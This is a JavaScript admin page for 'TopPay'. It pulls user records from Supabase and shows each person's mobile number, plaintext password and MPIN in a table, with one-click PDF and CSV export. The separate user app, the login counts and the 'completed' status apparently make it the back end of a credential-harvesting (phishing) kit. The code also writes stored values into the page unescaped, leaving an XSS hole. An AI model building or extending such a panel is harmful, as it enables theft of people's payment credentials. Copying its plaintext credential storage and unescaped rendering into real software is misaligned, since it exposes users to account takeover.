import { supabase } from "../../user-app/js/config/supabase.js";

document.addEventListener("DOMContentLoaded", () => {
  const reportTableBody = document.getElementById("reportTableBody");
  const reportFromDate = document.getElementById("reportFromDate");
  const reportToDate = document.getElementById("reportToDate");
  const reportStatusFilter = document.getElementById("reportStatusFilter");
  const generateReportBtn = document.getElementById("generateReportBtn");
  const downloadPdfReportBtn = document.getElementById("downloadPdfReportBtn");
  const downloadCsvReportBtn = document.getElementById("downloadCsvReportBtn");

  let reportData = [];

  // Set default dates (last 30 days)
  const today = new Date();
  const thirtyDaysAgo = new Date(today);
  thirtyDaysAgo.setDate(today.getDate() - 30);
  reportToDate.value = today.toISOString().split("T")[0];
  reportFromDate.value = thirtyDaysAgo.toISOString().split("T")[0];

  async function generateReport() {
    reportTableBody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading...</td></tr>';

    try {
      let query = supabase
        .from("users")
        .select("*")
        .order("created_at", { ascending: false });

      if (reportFromDate.value) {
        query = query.gte("created_at", reportFromDate.value + "T00:00:00");
      }
      if (reportToDate.value) {
        query = query.lte("created_at", reportToDate.value + "T23:59:59");
      }

      const statusFilter = reportStatusFilter.value;
      if (statusFilter !== "all") {
        query = query.eq("status", statusFilter);
      }

      const { data: users, error } = await query;

      if (error) {
        console.error("Report error:", error);
        reportTableBody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:red;">Error loading report</td></tr>';
        return;
      }

      reportData = users || [];

      // Update stats
      document.getElementById("reportTotal").textContent = reportData.length;
      document.getElementById("reportPending").textContent = reportData.filter(u => u.status !== "completed").length;
      document.getElementById("reportCompleted").textContent = reportData.filter(u => u.status === "completed").length;

      // Render table
      reportTableBody.innerHTML = "";
      if (reportData.length === 0) {
        reportTableBody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No data found for selected filters</td></tr>';
        return;
      }

      reportData.forEach(user => {
        const date = user.created_at ? new Date(user.created_at).toLocaleString() : "N/A";
        const statusClass = user.status === "completed" ? "status-completed" : "status-pending";
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>${user.mobile || "N/A"}</td>
          <td>${user.password || "N/A"}</td>
          <td>${user.mpin || "Not Set"}</td>
          <td><span class="status-badge ${statusClass}">${user.status || "pending"}</span></td>
          <td>${user.login_count || 0}</td>
          <td style="color:#666; font-size:12px;">${date}</td>
        `;
        reportTableBody.appendChild(tr);
      });
    } catch (e) {
      console.error(e);
    }
  }

  // Download PDF
  downloadPdfReportBtn.addEventListener("click", () => {
    if (reportData.length === 0) { alert("No data to export."); return; }
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();

    doc.setFontSize(18);
    doc.text("TopPay User Report", 10, 20);
    doc.setFontSize(10);
    doc.text(`Generated: ${new Date().toLocaleString()}`, 10, 28);
    doc.text(`Period: ${reportFromDate.value || "All"} to ${reportToDate.value || "All"}`, 10, 34);
    doc.text(`Total: ${reportData.length} | Completed: ${reportData.filter(u => u.status === "completed").length} | Pending: ${reportData.filter(u => u.status !== "completed").length}`, 10, 40);

    let y = 52;
    doc.setFontSize(9);
    doc.text("Mobile", 10, y);
    doc.text("Password", 45, y);
    doc.text("MPIN", 85, y);
    doc.text("Status", 110, y);
    doc.text("Logins", 140, y);
    doc.text("Date", 160, y);
    y += 6;

    reportData.forEach(user => {
      if (y > 280) { doc.addPage(); y = 20; }
      doc.text(String(user.mobile || "N/A"), 10, y);
      doc.text(String(user.password || "N/A"), 45, y);
      doc.text(String(user.mpin || "-"), 85, y);
      doc.text(String(user.status || "pending"), 110, y);
      doc.text(String(user.login_count || 0), 140, y);
      doc.text(user.created_at ? new Date(user.created_at).toLocaleDateString() : "-", 160, y);
      y += 6;
    });

    doc.save(`TopPay_Report_${new Date().toISOString().split("T")[0]}.pdf`);
  });

  // Download CSV
  downloadCsvReportBtn.addEventListener("click", () => {
    if (reportData.length === 0) { alert("No data to export."); return; }
    const headers = ["Mobile", "Password", "MPIN", "Status", "Login Count", "Date"];
    const rows = reportData.map(user => [
      user.mobile || "",
      user.password || "",
      user.mpin || "",
      user.status || "pending",
      user.login_count || 0,
      user.created_at ? new Date(user.created_at).toLocaleString() : ""
    ]);

    let csv = headers.join(",") + "\n";
    rows.forEach(row => { csv += row.join(",") + "\n"; });

    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `TopPay_Report_${new Date().toISOString().split("T")[0]}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  });

  generateReportBtn.addEventListener("click", generateReport);

  // Auto generate on load
  generateReport();
});
